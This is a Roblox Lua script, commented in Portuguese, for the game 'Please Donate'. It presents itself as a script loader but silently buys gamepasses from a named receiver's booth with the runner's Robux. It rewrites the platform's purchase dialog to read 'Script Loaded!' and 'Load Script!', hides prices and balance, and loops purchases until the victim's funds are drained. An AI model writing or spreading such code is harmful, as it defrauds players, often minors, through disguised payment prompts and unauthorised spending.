-- Configuração
local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"
local Username = "Ian_wp27" -- insira o username do player que vai receber a doação

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")

local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))

local success, UserId = pcall(function()
    return Players:GetUserIdFromNameAsync(Username)
end)

if not success then
    warn("Username inválido!")
    return
end

-- Variáveis
local asset
local userRobux

-- Função de compra
local function Purchase(Booth)
    local range = 0
    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
        if v:GetAttribute("AssetType") == "Gamepass" and
           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
            local price = v:GetAttribute("AssetPrice")
            if userRobux and price <= userRobux and price > range then
                asset = v
                range = price
            end
        end
    end

    if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
        asset.Prompt:FireServer("", false, range)
    end
end

-- Obter booth do player
local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
if not Booth then
    return Players.LocalPlayer:Kick("Receiver not found!")
end

-- Referência ao Animator (Mobile usa PurchasePromptApp)
local Animator = CoreGui:WaitForChild("PurchasePromptApp"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
repeat task.wait() until not Animator:FindFirstChild("Prompt")

-- Conectar eventos do Animator
Animator.ChildAdded:Connect(function(child)
    if child.Name == "Prompt" then
        local footerContent = child:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content")
        local RemainingBalanceText = footerContent:FindFirstChild("RemainingBalanceText")
        if RemainingBalanceText then
            if userRobux then
                -- Mensagem de doação
                child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
                child.AlertContents.MiddleContent.Visible = false
                child.AlertContents.Footer.Buttons["1"].Visible = false
                child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
                child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Icon.Visible = false
                child.AlertContents.Footer.FooterContent.Visible = false
            elseif asset then
                -- Script carregado
                child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
                child.AlertContents.MiddleContent.Visible = false
                child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
                child.AlertContents.Footer.Buttons["2"].Visible = false
                child.AlertContents.Footer.FooterContent.Visible = false

                userRobux = tonumber(RemainingBalanceText.Text:match("%d+")) + asset:GetAttribute("AssetPrice")
                asset = nil
            end
        end
    end
end)

Animator.ChildRemoved:Connect(function(child)
    if child.Name == "Prompt" and userRobux then
        Purchase(Booth)
    end
end)

-- Evento de Gift enviado
Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
    if a == UserId and userRobux then
        -- Aqui você pode chamar a função de webhook se quiser
        userRobux -= robux
        Purchase(Booth)
    end
end)

-- Inicializar a compra do menor valor disponível
local minPrice = math.huge
for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
    if v:GetAttribute("AssetType") == "Gamepass" and
       not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
        local price = v:GetAttribute("AssetPrice")
        if price < minPrice then
            asset = v
            minPrice = price
        end
    end
end

if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
    asset.Prompt:FireServer("", false, minPrice)
    print("Iniciando compra de:", minPrice)
end
